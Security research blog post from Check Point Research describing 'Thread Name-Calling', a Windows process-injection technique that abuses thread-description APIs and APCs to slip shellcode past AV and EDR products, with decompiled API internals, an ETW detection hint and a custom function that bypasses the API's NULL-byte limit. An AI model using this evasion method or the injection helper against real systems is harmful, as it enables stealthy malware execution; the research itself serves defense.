# https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/

## CATEGORIES

- [Android Malware23](https://research.checkpoint.com/category/android-malware/)
- [Artificial Intelligence4](https://research.checkpoint.com/category/artificial-intelligence-2/)
- [ChatGPT3](https://research.checkpoint.com/category/chatgpt/)
- [Check Point Research Publications443](https://research.checkpoint.com/category/threat-research/)
- [Cloud Security1](https://research.checkpoint.com/category/cloud-security/)
- [CPRadio44](https://research.checkpoint.com/category/cpradio/)
- [Crypto2](https://research.checkpoint.com/category/crypto/)
- [Data & Threat Intelligence1](https://research.checkpoint.com/category/data-threat-intelligence/)
- [Data Analysis0](https://research.checkpoint.com/category/data-analysis/)
- [Demos22](https://research.checkpoint.com/category/demos/)
- [Global Cyber Attack Reports395](https://research.checkpoint.com/category/threat-intelligence-reports/)
- [How To Guides13](https://research.checkpoint.com/category/how-to-guides/)
- [Ransomware3](https://research.checkpoint.com/category/ransomware/)
- [Russo-Ukrainian War1](https://research.checkpoint.com/category/russo-ukrainian-war/)
- [Security Report1](https://research.checkpoint.com/category/security-report/)
- [Threat and data analysis0](https://research.checkpoint.com/category/threat-and-data-analysis/)
- [Threat Research173](https://research.checkpoint.com/category/threat-research-2/)
- [Web 3.0 Security11](https://research.checkpoint.com/category/web3/)
- [Wipers0](https://research.checkpoint.com/category/wipers/)

![](https://research.checkpoint.com/wp-content/uploads/2024/07/TXYQKLGPF9-rId20.png)

# Thread Name-Calling – using Thread Name for offense


July 25, 2024

[Share on LinkedIn!](https://www.linkedin.com/shareArticle?mini=true&url=https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/%20-%20%20https://research.checkpoint.com/?p=30223;source=LinkedIn "Share on LinkedIn!") [Share on Facebook!](http://www.facebook.com/sharer.php?u=https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/%20-%20https://research.checkpoint.com/?p=30223 "Share on Facebook!") [Tweet this!](http://twitter.com/home/?status=Thread%20Name-Calling%20%E2%80%93%20using%20Thread%20Name%20for%20offense%20-%20https://research.checkpoint.com/?p=30223%20via%20@kenmata "Tweet this!")

https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/

**Research by:** hasherezade

## Highlights:

- _**Process Injection is one of the important techniques in the attackers’ toolkit.**_
- _**In the following write-up, Check Point Research (CPR) explains how the API for thread descriptions can be abused to bypass endpoint protection products.**_
- _**We propose a new injection technique: Thread Name-Calling, and offer the advisory related to implementing protection.**_

## Introduction

Process injection is one of the [important techniques used by attackers](https://attack.mitre.org/techniques/T1055/). We can find its variants implemented in almost every malware. It serves purposes such as:

- [defense evasion](https://attack.mitre.org/tactics/TA0005/): hiding malicious modules under the cover of a different process
- interference in the existing process: reading its memory, hooking the used API, etc.
- [privilege escalation](https://attack.mitre.org/tactics/TA0004/)

Due to the fact that interference in the memory of a process by malicious modules can cause a lot of damage, all sorts of AV and EDR products monitor such behaviors and try to prevent them. However, this monitoring is based on the knowledge about the common APIs used in implementations of the injection methods. This cat-and-mouse game never ends. Cybercriminals, as well as [red teamers](https://en.wikipedia.org/wiki/Red_team), keep trying to break the known patterns, by using some atypical APIs, and thanks to this, to evade the detection implemented at the time. One example of this is the [Atom Bombing technique](https://www.fortinet.com/blog/threat-research/atombombing-brand-new-code-injection-technique-for-windows) (from 2016), which uses [the Atom Table](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-globaladdatoma) to pass the code into the remote process, or the recently introduced [Pool Party](https://www.safebreach.com/blog/process-injection-using-windows-thread-pools) (from 2023), where the thread pools were abused to run the code in the context of a different process, without the EDRs noticing it. The diversity of the APIs used has been very well described in the paper [“Windows Process Injection in 2019” by Amit Klein and Itzik Kotler](https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf).

Thread Name-Calling is yet another take on this topic. It is a technique allowing to implant a shellcode into a running process, using the following Windows APIs:

- `GetThreadDescription`/ `SetThreadDescription` (introduced in Windows 10, 1607) – an API for setting and retrieving the thread description (a.k.a. thread name)
- `ZwQueueApcThreadEx2` (introduced in Windows 10, 19045) – a new API for [Asynchronous Procedure Calls (APC)](https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls)

The remote memory allocation, and writing to it, is achieved on the process using a handle without the write access ( [`PROCESS_VM_WRITE`](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights) **)**. Thanks to this feature, and also due to the fact that the APIs we used are not commonly associated with process injection, we were able to bypass some of the major AV and EDR products. In this blog we elaborate on the implementation details of this new technique and suggest some possible detection methods.

## Thread Name in offensive use-cases

Before we begin, note that the involved functions are relatively new, and are not used in any well-established injection methods. However, they are not “brand new” – they have been added a few years ago, so naturally we are not the first ones to research about their potential for offensive scenarios. Some of the related uses were discussed on X/Twitter (we found a question by [Adam “Hexacorn” from 2020](https://x.com/Hexacorn/status/1317424213951733761), and by [Gal Yaniv from 2021](https://x.com/_Gal_Yaniv/status/1353630677493837825) referencing those APIs). We tried to collect the various use-cases to the best of our abilities, and list the related PoCs.

Get/SetThreadDescription may be utilized in:

- undocumented IPC: a thread name is used as a “mailbox” via which two processes are exchanging messages. The sender process can pass information to a receiver process by setting a description on one of its threads. The receiver reads the description from the thread and process it further.
  - implementation: [https://github.com/LloydLabs/dearg-thread-ipc-stealth](https://github.com/LloydLabs/dearg-thread-ipc-stealth)
- hiding inactive code implant from a memory scan. This idea is similar to [ShellcodeFluctuation](https://github.com/mgeeky/ShellcodeFluctuation), but instead of / in addition to encryption, we temporarily store the code as a thread name (which is a kernel mode structure), out of the working set – that means, out of sight of the user mode memory scanners. It will be repeatedly retrieved into the working set, executed for a small time slot, then stored again as the thread name.

  - implementation: [ORCA / T.D.P · GitLab](https://gitlab.com/ORCA000/t.d.p)
- allocating memory in the kernel mode from user mode so that it can be further used in scenarios related to kernel mode exploitation
  - implementation: [Small dumps in the big pool (blahcat.github.io)](https://web.archive.org/web/20221009194014/https://blahcat.github.io/posts/2019/03/17/small-dumps-in-the-big-pool.html)
- remote code injection
  - “DoubleBarrel” – by Sam Russel, 2022 : [https://www.lodsb.com/shellcode-injection-using-threadnameinformation](https://www.lodsb.com/shellcode-injection-using-threadnameinformation) : injects code using a variant of [thread hijacking](https://www.ired.team/offensive-security/code-injection-process-injection/injecting-to-remote-process-via-thread-hijacking), redirecting the thread execution to the [ROP](https://ctf101.org/binary-exploitation/return-oriented-programming/) chain that is facilitated by a content passed via the thread name. This technique does not create additional executable memory space – that gives it a potential to evade some detections. The downsides are the limitations imposed on the shellcode (it must be a handcrafted [ROP](https://ctf101.org/binary-exploitation/return-oriented-programming/) chain, containing gadgets specific to the particular version of Windows), and the possible instability of the target application after the shellcode execution. Also, use of the API for direct thread manipulation is prone to trigger alerts.
  - “Thread Name-Calling injection” – the technique introduced in this article. The code to be injected is passed as a thread description to the target. Next, the function `GetThreadDescription` is called remotely on the target, via [APC](https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls), causing the description buffer to be copied into the target’s [working set](https://learn.microsoft.com/en-us/windows/win32/procthread/process-working-set). After making the buffer executable, it is run using another [APC](https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls) call. It supports any custom shellcode. This technique does not corrupt the original thread: the target application seamlessly continues its execution.
- DLL injection variant: typically for this technique, we write a path to our DLL into the address space of the target, and then remotely call `LoadLibrary` to get the DLL loaded within the target. In contrast to the [classic implementation](https://attack.mitre.org/techniques/T1055/001/) that uses `VirtualAllocEx` and `WriteProcessMemory`, here the path of the DLL is passed via thread name (remote write achieved as in the Thread Name-Calling).

  - This technique is described in the “Bonus” section of this article.

## The APIs Used

Lets start by looking at the APIs that are vital for the introduced technique. Understanding the details of their implementation is crucial for explaining the further abuse.

### GetThreadDescription / SetThreadDescription

Since Windows 10, 1607 the following functions were added to the Windows API:

[GetThreadDescription](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreaddescription)

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

HRESULT GetThreadDescription(

\[in\] HANDLE hThread,

\[out\] PWSTR \*ppszThreadDescription

);

HRESULT GetThreadDescription(
\[in\] HANDLE hThread,
\[out\] PWSTR \*ppszThreadDescription
);

```
HRESULT GetThreadDescription(
 [in] HANDLE hThread,
 [out] PWSTR *ppszThreadDescription
);
```

[SetThreadDescription](https://learn.microsoft.com/pl-pl/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreaddescription)

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

HRESULT SetThreadDescription(

\[in\] HANDLE hThread,

\[in\] PCWSTR lpThreadDescription

);

HRESULT SetThreadDescription(
\[in\] HANDLE hThread,
\[in\] PCWSTR lpThreadDescription
);

```
HRESULT SetThreadDescription(
 [in] HANDLE hThread,
 [in] PCWSTR lpThreadDescription
);
```

Their expected usage is related to setting the description (name) of a thread. That enables us to identify its functionality, and can help i.e. in debugging. However, if we look at this API with an offensive mindset, we can quickly see some potential for misuse.

To set the name, we need to open a handle to the thread with the access flag `THREAD_SET_LIMITED_INFORMATION`. Under this minimal requirement, we can attach our arbitrary buffer to any thread of a remote process.

The buffer must be a Unicode string, which basically means, any buffer terminated by a `L'\0'`(double NULL byte). The size that we can allocate is pretty generous: [`0x10000` bytes](https://web.archive.org/web/20221009194014/https://blahcat.github.io/posts/2019/03/17/small-dumps-in-the-big-pool.html)  – of which, according to experiments, we can use `(0x10000 - 2)` for our data buffer (including the terminator). This is an equivalent of almost 16 pages of data, which is well enough to store a block of shellcode…

### API Implementation

The described functions are implemented in `Kernelbase.dll`.

1. [SetThreadDescription](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreaddescription):

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

#define ThreadNameInformation 0x26

HRESULT \_\_stdcall SetThreadDescription(HANDLE hThread, PCWSTR lpThreadDescription)

{

NTSTATUS status; // eax

struct \_UNICODE\_STRING DestinationString;

status = RtlInitUnicodeStringEx(&DestinationString, lpThreadDescription);

if( status >= 0 )

status = NtSetInformationThread(hThread, ThreadNameInformation, &DestinationString, 0x10u);

return status \| 0x10000000;

}

#define ThreadNameInformation 0x26

HRESULT \_\_stdcall SetThreadDescription(HANDLE hThread, PCWSTR lpThreadDescription)
{
NTSTATUS status; // eax
struct \_UNICODE\_STRING DestinationString;

status = RtlInitUnicodeStringEx(&DestinationString, lpThreadDescription);
if ( status >= 0 )
status = NtSetInformationThread(hThread, ThreadNameInformation, &DestinationString, 0x10u);
return status \| 0x10000000;
}

```
#define ThreadNameInformation 0x26

HRESULT __stdcall SetThreadDescription(HANDLE hThread, PCWSTR lpThreadDescription)
{
  NTSTATUS status; // eax
  struct _UNICODE_STRING DestinationString;

  status = RtlInitUnicodeStringEx(&DestinationString, lpThreadDescription);
  if ( status >= 0 )
    status = NtSetInformationThread(hThread, ThreadNameInformation, &DestinationString, 0x10u);
  return status | 0x10000000;
}
```

This function expects us to pass a Unicode string buffer (`WCHAR*`), from which it creates a [UNICODE\_STRING](https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string) structure, that is passed further. Looking at the implementation, we can see that the setting of the string onto the thread is implemented by `NtSetInformationThread`. The returned value is a result of the aforementioned low-level API [converted from NTSTATUS to HRESULT, by setting `FACILITY_NT_BIT`](https://learn.microsoft.com/en-us/windows/win32/api/winerror/nf-winerror-hresult_from_nt) ( [`0x10000000`](https://doxygen.reactos.org/d4/ded/winerror_8h.html#a13eeae83428d978094fe05850465dfcf) ).

In our implementation of a remote write, we start by calling `SetThreadDescription` on a remote thread, making it hold our buffer.

2. [GetThreadDescription](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreaddescription):

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

HRESULT \_\_stdcall GetThreadDescription(HANDLE hThread, PWSTR \*ppszThreadDescription)

{

SIZE\_T struct\_len; // rbx

SIZE\_T struct\_size; // r8

NTSTATUS res; // eax

NTSTATUS status; // ebx

const UNICODE\_STRING \*struct\_buf; // rdi

ULONG ReturnLength; // \[rsp+58h\] \[rbp+10h\] BYREF

\*ppszThreadDescription = nullptr;

LODWORD(struct\_len) = 144;

RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, 0);

for( struct\_size = 146; ; struct\_size = struct\_len + 2 )

{

struct\_buf = (const UNICODE\_STRING \*)RtlAllocateHeap(NtCurrentPeb()->ProcessHeap, 0, struct\_size);

if( !struct\_buf )

{

status = 0xC0000017;

goto finish;

}

res = NtQueryInformationThread(

hThread,

ThreadNameInformation,

(PVOID)struct\_buf,

struct\_len,

&ReturnLength);

status = res;

if( res != 0xC0000004 && res != 0xC0000023 && res != 0x80000005)

break;

struct\_len = ReturnLength;

RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, (PVOID)struct\_buf);

}

if( res >= 0 )

{

ReturnLength = struct\_buf->Length;

// move the buffer to the beginning of the structure

memmove\_0((void \*)struct\_buf, struct\_buf->Buffer, ReturnLength);

// null terminate the buffer

\*(&struct\_buf->Length + ((unsigned \_\_int64)ReturnLength >> 1)) = 0;

// fill in the passed pointer

\*ppszThreadDescription = &struct\_buf->Length;

struct\_buf = 0i64;

}

finish:

RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, (PVOID)struct\_buf);

return status \| 0x10000000;

}

HRESULT \_\_stdcall GetThreadDescription(HANDLE hThread, PWSTR \*ppszThreadDescription)
{
SIZE\_T struct\_len; // rbx
SIZE\_T struct\_size; // r8
NTSTATUS res; // eax
NTSTATUS status; // ebx
const UNICODE\_STRING \*struct\_buf; // rdi
ULONG ReturnLength; // \[rsp+58h\] \[rbp+10h\] BYREF

\*ppszThreadDescription = nullptr;
LODWORD(struct\_len) = 144;
RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, 0);
for ( struct\_size = 146; ; struct\_size = struct\_len + 2 )
{
struct\_buf = (const UNICODE\_STRING \*)RtlAllocateHeap(NtCurrentPeb()->ProcessHeap, 0, struct\_size);
if ( !struct\_buf )
{
status = 0xC0000017;
goto finish;
}
res = NtQueryInformationThread(
hThread,
ThreadNameInformation,
(PVOID)struct\_buf,
struct\_len,
&ReturnLength);
status = res;
if ( res != 0xC0000004 && res != 0xC0000023 && res != 0x80000005 )
break;
struct\_len = ReturnLength;
RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, (PVOID)struct\_buf);
}
if ( res >= 0 )
{
ReturnLength = struct\_buf->Length;
// move the buffer to the beginning of the structure
memmove\_0((void \*)struct\_buf, struct\_buf->Buffer, ReturnLength);
// null terminate the buffer
\*(&struct\_buf->Length + ((unsigned \_\_int64)ReturnLength >> 1)) = 0;
// fill in the passed pointer
\*ppszThreadDescription = &struct\_buf->Length;
struct\_buf = 0i64;
}
finish:
RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, (PVOID)struct\_buf);
return status \| 0x10000000;
}

```
HRESULT __stdcall GetThreadDescription(HANDLE hThread, PWSTR *ppszThreadDescription)
{
  SIZE_T struct_len; // rbx
  SIZE_T struct_size; // r8
  NTSTATUS res; // eax
  NTSTATUS status; // ebx
  const UNICODE_STRING *struct_buf; // rdi
  ULONG ReturnLength; // [rsp+58h] [rbp+10h] BYREF

  *ppszThreadDescription = nullptr;
  LODWORD(struct_len) = 144;
  RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, 0);
  for ( struct_size = 146; ; struct_size = struct_len + 2 )
  {
    struct_buf = (const UNICODE_STRING *)RtlAllocateHeap(NtCurrentPeb()->ProcessHeap, 0, struct_size);
    if ( !struct_buf )
    {
      status = 0xC0000017;
      goto finish;
    }
    res = NtQueryInformationThread(
            hThread,
            ThreadNameInformation,
            (PVOID)struct_buf,
            struct_len,
            &ReturnLength);
    status = res;
    if ( res != 0xC0000004 && res != 0xC0000023 && res != 0x80000005 )
      break;
    struct_len = ReturnLength;
    RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, (PVOID)struct_buf);
  }
  if ( res >= 0 )
  {
    ReturnLength = struct_buf->Length;
    // move the buffer to the beginning of the structure
    memmove_0((void *)struct_buf, struct_buf->Buffer, ReturnLength);
    // null terminate the buffer
    *(&struct_buf->Length + ((unsigned __int64)ReturnLength >> 1)) = 0;
    // fill in the passed pointer
    *ppszThreadDescription = &struct_buf->Length;
    struct_buf = 0i64;
  }
finish:
  RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, (PVOID)struct_buf);
  return status | 0x10000000;
}
```

Analyzing this function reveals some other interesting implementation details. The buffer for the thread name that we want to retrieve is allocated on a heap within the retrieving process. The function automatically allocates a size that can fit the relevant [UNICODE\_STRING](https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string). It then erases the initial fields of the structure (`Length` and `MaximumLength`), and moves the buffer content towards the beginning of the structure, transforming it into a simple, null-terminated wide string. Next, the pointer to this new buffer is filled into the variable passed by the caller.

If we call `GetThreadDescription` remotely, in the context of the target process, we gain a remote allocation of a buffer on the heap, plus, getting it filled with our content.

### Location of the structure

Looking at the implementation, we can notice that a buffer that we retrieve via `GetThreadDescription` is just a local copy. Now the question is: where is the original [UNICODE\_STRING](https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string), associated with the thread, stored? To learn more we need to look into the Windows kernel (`ntoskrnl.exe`), at the implementation of the syscalls that set /read it ( `NtSetInformationThread` and `NtQueryInformationThread`).

It turns out this buffer is stored in the Kernel Mode, represented by the field in `ETHREAD` → `ThreadName`.

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

lkd> dt nt!\_ETHREAD

\[...\]

+0x610 ThreadName : Ptr64 \_UNICODE\_STRING

\[...\]

lkd> dt nt!\_ETHREAD
\[...\]
+0x610 ThreadName : Ptr64 \_UNICODE\_STRING
\[...\]

```
   lkd> dt nt!_ETHREAD
   [...]
   +0x610 ThreadName       : Ptr64 _UNICODE_STRING
   [...]
```

Fragment of `NtSetInformationThread` responsible for setting the thread name (in Kernel Mode):

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

\[...\]

Length = Src.Length;

if((Src.Length & 1) != 0 \|\| Src.Length> Src.MaximumLength)

{

status = 0xC000000D; // STATUS\_INVALID\_PARAMETER -> invalid buffer size supplied

}

else

{

PoolWithTag = ExAllocatePoolWithTag(NonPagedPoolNx, Src.Length \+ 16i64, 'mNhT'); // allocating a buffer on non paged pool, with tag 'ThNm'

threadName = PoolWithTag;

v113 = PoolWithTag;

if( PoolWithTag )

{

p\_Length = &PoolWithTag\[1\].Length;

threadName->Buffer = p\_Length;

threadName->Length = Length;

threadName->MaximumLength = Length;

memmove(p\_Length, Src.Buffer, Length);

eThread = Object;

PspLockThreadSecurityExclusive(Object, CurrentThread);

v105 = 1;

P = eThread->ThreadName;

eThread->ThreadName = threadName;

threadName = 0i64;

v113 = 0i64;

EtwTraceThreadSetName(eThread);

goto finish;

}

status = 0xC000009A;

}

}

else

{

status = 0xC0000004;

}

v104 = status;

finish:

\[...\]

\[...\]
Length = Src.Length;
if ( (Src.Length & 1) != 0 \|\| Src.Length > Src.MaximumLength )
{
status = 0xC000000D; // STATUS\_INVALID\_PARAMETER -> invalid buffer size supplied
}
else
{
PoolWithTag = ExAllocatePoolWithTag(NonPagedPoolNx, Src.Length + 16i64, 'mNhT'); // allocating a buffer on non paged pool, with tag 'ThNm'
threadName = PoolWithTag;
v113 = PoolWithTag;
if ( PoolWithTag )
{
p\_Length = &PoolWithTag\[1\].Length;
threadName->Buffer = p\_Length;
threadName->Length = Length;
threadName->MaximumLength = Length;
memmove(p\_Length, Src.Buffer, Length);
eThread = Object;
PspLockThreadSecurityExclusive(Object, CurrentThread);
v105 = 1;
P = eThread->ThreadName;
eThread->ThreadName = threadName;
threadName = 0i64;
v113 = 0i64;
EtwTraceThreadSetName(eThread);
goto finish;
}
status = 0xC000009A;
}
}
else
{
status = 0xC0000004;
}
v104 = status;
finish:
\[...\]

```
[...]
          Length = Src.Length;
          if ( (Src.Length & 1) != 0 || Src.Length > Src.MaximumLength )
          {
            status = 0xC000000D; // STATUS_INVALID_PARAMETER -> invalid buffer size supplied
          }
          else
          {
            PoolWithTag = ExAllocatePoolWithTag(NonPagedPoolNx, Src.Length + 16i64, 'mNhT'); // allocating a buffer on non paged pool, with tag 'ThNm'
            threadName = PoolWithTag;
            v113 = PoolWithTag;
            if ( PoolWithTag )
            {
              p_Length = &PoolWithTag[1].Length;
              threadName->Buffer = p_Length;
              threadName->Length = Length;
              threadName->MaximumLength = Length;
              memmove(p_Length, Src.Buffer, Length);
              eThread = Object;
              PspLockThreadSecurityExclusive(Object, CurrentThread);
              v105 = 1;
              P = eThread->ThreadName;
              eThread->ThreadName = threadName;
              threadName = 0i64;
              v113 = 0i64;
              EtwTraceThreadSetName(eThread);
              goto finish;
            }
            status = 0xC000009A;
          }
        }
        else
        {
          status = 0xC0000004;
        }
        v104 = status;
finish:
[...]
```

As we can see, the buffer is allocated on [`NonPagedPoolNx`](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/nx-and-execute-pool-types) (non-executable non-paged pool). The allocated buffer is filled with the `UNICODE_STRING`, and its pointer is stored in `ThreadName` within the [`ETHREAD`](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/eprocess) structure of a particular thread.

The event of setting the `ThreadName` is registered by [**ETW (Event Tracing for Windows)**](https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/event-tracing-for-windows--etw-), which can be further used to detect this injection method. The generated event collects data such as ProcessID and ThreadID, which are required to identify the thread and the ThreadName that was set.

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

\_\_int64 \_\_fastcall EtwTraceThreadSetName(\_ETHREAD \*thread)

{

int v1; // r10d

\_UNICODE\_STRING \*ThreadName; // rax

\_\_int64 \*Buffer; // rcx

unsignedint Length; // edx

unsigned \_\_int64 len; // rax

int v7\[4\]; // \[rsp+30h\] \[rbp-50h\] BYREF

\_\_int64 v8\[2\]; // \[rsp+40h\] \[rbp-40h\] BYREF

\_\_int64 \*buf; // \[rsp+50h\] \[rbp-30h\]

\_\_int64 v10; // \[rsp+58h\] \[rbp-28h\]

\_\_int64 \*v11; // \[rsp+60h\] \[rbp-20h\]

\_\_int64 v12; // \[rsp+68h\] \[rbp-18h\]

v7\[0\] = thread->Cid.UniqueProcess;

v1 = 2;

v7\[1\] = thread->Cid.UniqueThread;

v8\[0\] = v7;

ThreadName = thread->ThreadName;

v7\[2\] = 0;

v8\[1\] = 8i64;

if( ThreadName && (Buffer = ThreadName->Buffer) != 0i64 )

{

Length = ThreadName->Length;

len = 0x800i64;

if( Length < 0x800u )

len = Length;

buf = Buffer;

v10 = len;

if( !len \|\| \*(Buffer + (len >> 1) \- 1))

{

v12 = 2i64;

v11 = &EtwpNull;

v1 = 3;

}

}

else

{

v10 = 2i64;

buf = &EtwpNull;

}

returnEtwTraceKernelEvent(v8, v1, 2, 1352, 0x501802);

}

\_\_int64 \_\_fastcall EtwTraceThreadSetName(\_ETHREAD \*thread)
{
int v1; // r10d
\_UNICODE\_STRING \*ThreadName; // rax
\_\_int64 \*Buffer; // rcx
unsigned int Length; // edx
unsigned \_\_int64 len; // rax
int v7\[4\]; // \[rsp+30h\] \[rbp-50h\] BYREF
\_\_int64 v8\[2\]; // \[rsp+40h\] \[rbp-40h\] BYREF
\_\_int64 \*buf; // \[rsp+50h\] \[rbp-30h\]
\_\_int64 v10; // \[rsp+58h\] \[rbp-28h\]
\_\_int64 \*v11; // \[rsp+60h\] \[rbp-20h\]
\_\_int64 v12; // \[rsp+68h\] \[rbp-18h\]

v7\[0\] = thread->Cid.UniqueProcess;
v1 = 2;
v7\[1\] = thread->Cid.UniqueThread;
v8\[0\] = v7;
ThreadName = thread->ThreadName;
v7\[2\] = 0;
v8\[1\] = 8i64;
if ( ThreadName && (Buffer = ThreadName->Buffer) != 0i64 )
{
Length = ThreadName->Length;
len = 0x800i64;
if ( Length < 0x800u )
len = Length;
buf = Buffer;
v10 = len;
if ( !len \|\| \*(Buffer + (len >> 1) - 1) )
{
v12 = 2i64;
v11 = &EtwpNull;
v1 = 3;
}
}
else
{
v10 = 2i64;
buf = &EtwpNull;
}
return EtwTraceKernelEvent(v8, v1, 2, 1352, 0x501802);
}

```
__int64 __fastcall EtwTraceThreadSetName(_ETHREAD *thread)
{
  int v1; // r10d
  _UNICODE_STRING *ThreadName; // rax
  __int64 *Buffer; // rcx
  unsigned int Length; // edx
  unsigned __int64 len; // rax
  int v7[4]; // [rsp+30h] [rbp-50h] BYREF
  __int64 v8[2]; // [rsp+40h] [rbp-40h] BYREF
  __int64 *buf; // [rsp+50h] [rbp-30h]
  __int64 v10; // [rsp+58h] [rbp-28h]
  __int64 *v11; // [rsp+60h] [rbp-20h]
  __int64 v12; // [rsp+68h] [rbp-18h]

  v7[0] = thread->Cid.UniqueProcess;
  v1 = 2;
  v7[1] = thread->Cid.UniqueThread;
  v8[0] = v7;
  ThreadName = thread->ThreadName;
  v7[2] = 0;
  v8[1] = 8i64;
  if ( ThreadName && (Buffer = ThreadName->Buffer) != 0i64 )
  {
    Length = ThreadName->Length;
    len = 0x800i64;
    if ( Length < 0x800u )
      len = Length;
    buf = Buffer;
    v10 = len;
    if ( !len || *(Buffer + (len >> 1) - 1) )
    {
      v12 = 2i64;
      v11 = &EtwpNull;
      v1 = 3;
    }
  }
  else
  {
    v10 = 2i64;
    buf = &EtwpNull;
  }
  return EtwTraceKernelEvent(v8, v1, 2, 1352, 0x501802);
}
```

### Removing the NULL byte limitations

Setting the thread name by the official API imposes some limitations on the buffer. It has to be a valid Unicode string, that means, an empty WCHAR will be used as a buffer terminator. The size of WCHAR is two bytes – so if our shellcode has any double NULL byte inside only the part before it will be copied. This is a common limitation encountered whenever the shellcode is to be passed via buffer dedicated to hold strings. To solve this issue, shellcode encoders have been invented: they allow to convert a buffer into a format that is free from NULL bytes. We can use one of them in our case as well.

However, by analyzing the implementation of the above API, we realized that it is actually possible to avoid this limitation at its root. When the Thread Name is copied between different buffers, the declared length from [the `UNICODE_STRING` structure](https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string) is used, along with `memmove` function, which does not treat NULL bytes as terminators. The only function that imposes the NULL byte constraint is `SetThreadDescription`. Underneath, it calls `RtlInitUnicodeStringEx` that takes the passed WCHAR buffer, and uses it to initializes the UNICODE\_STRING structure. The input buffer must be NULL terminated, and the length to be saved in the structure is determined basing on the position of this character.

We can create an easy workaround for our problem, by using a custom implementation of SetThreadDescription:

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

HRESULT mySetThreadDescription(HANDLE hThread, const BYTE\* buf, size\_t buf\_size)

{

UNICODE\_STRING DestinationString = { 0 };

BYTE\* padding = (BYTE\*)::calloc(buf\_size + sizeof(WCHAR), 1);

::memset(padding, 'A', buf\_size);

auto pRtlInitUnicodeStringEx = reinterpret\_cast<decltype(&RtlInitUnicodeStringEx)>(GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlInitUnicodeStringEx"));

pRtlInitUnicodeStringEx(&DestinationString, (PCWSTR)padding);

// fill with our real content:

::memcpy(DestinationString.Buffer, buf, buf\_size);

auto pNtSetInformationThread = reinterpret\_cast<decltype(&NtSetInformationThread)>(GetProcAddress(GetModuleHandle("ntdll.dll"), "NtSetInformationThread"));

NTSTATUS status = pNtSetInformationThread(hThread, (THREADINFOCLASS)(ThreadNameInformation), &DestinationString, 0x10u);

::free(padding);

returnHRESULT\_FROM\_NT(status);

}

HRESULT mySetThreadDescription(HANDLE hThread, const BYTE\* buf, size\_t buf\_size)
{
UNICODE\_STRING DestinationString = { 0 };
BYTE\* padding = (BYTE\*)::calloc(buf\_size + sizeof(WCHAR), 1);
::memset(padding, 'A', buf\_size);

auto pRtlInitUnicodeStringEx = reinterpret\_cast<decltype(&RtlInitUnicodeStringEx)>(GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlInitUnicodeStringEx"));
pRtlInitUnicodeStringEx(&DestinationString, (PCWSTR)padding);
// fill with our real content:
::memcpy(DestinationString.Buffer, buf, buf\_size);

auto pNtSetInformationThread = reinterpret\_cast<decltype(&NtSetInformationThread)>(GetProcAddress(GetModuleHandle("ntdll.dll"), "NtSetInformationThread"));
NTSTATUS status = pNtSetInformationThread(hThread, (THREADINFOCLASS)(ThreadNameInformation), &DestinationString, 0x10u);
::free(padding);
return HRESULT\_FROM\_NT(status);
}

```
HRESULT mySetThreadDescription(HANDLE hThread, const BYTE* buf, size_t buf_size)
{
    UNICODE_STRING DestinationString = { 0 };
    BYTE* padding = (BYTE*)::calloc(buf_size + sizeof(WCHAR), 1);
    ::memset(padding, 'A', buf_size);

    auto pRtlInitUnicodeStringEx = reinterpret_cast<decltype(&RtlInitUnicodeStringEx)>(GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlInitUnicodeStringEx"));
    pRtlInitUnicodeStringEx(&DestinationString, (PCWSTR)padding);
    // fill with our real content:
    ::memcpy(DestinationString.Buffer, buf, buf_size);

    auto pNtSetInformationThread = reinterpret_cast<decltype(&NtSetInformationThread)>(GetProcAddress(GetModuleHandle("ntdll.dll"), "NtSetInformationThread"));
    NTSTATUS status = pNtSetInformationThread(hThread, (THREADINFOCLASS)(ThreadNameInformation), &DestinationString, 0x10u);
    ::free(padding);
    return HRESULT_FROM_NT(status);
}
```

